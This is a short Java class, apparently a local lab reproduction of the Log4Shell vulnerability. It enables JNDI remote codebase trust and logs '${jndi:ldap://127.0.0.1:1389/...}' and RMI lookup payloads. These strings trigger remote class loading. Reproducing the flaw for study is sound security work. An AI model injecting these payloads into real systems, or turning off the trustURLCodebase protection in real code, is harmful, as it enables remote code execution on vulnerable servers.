package com.fhdone.paper2019.util.log4jhack;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class RunBug {

    private Logger logger = LogManager.getLogger(RunBug.class);


	public void test(){
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		//logger.error("${jndi:rmi://127.0.0.1:1099/BugFinder}");

		logger.error("${jndi:ldap://127.0.0.1:1389/o=reference}");
		try {
			Thread.sleep(5000);
		} catch (Exception e) {
		}
	}

	public static void main(String[] args){
		RunBug s = new RunBug();
		s.test();
	}

}
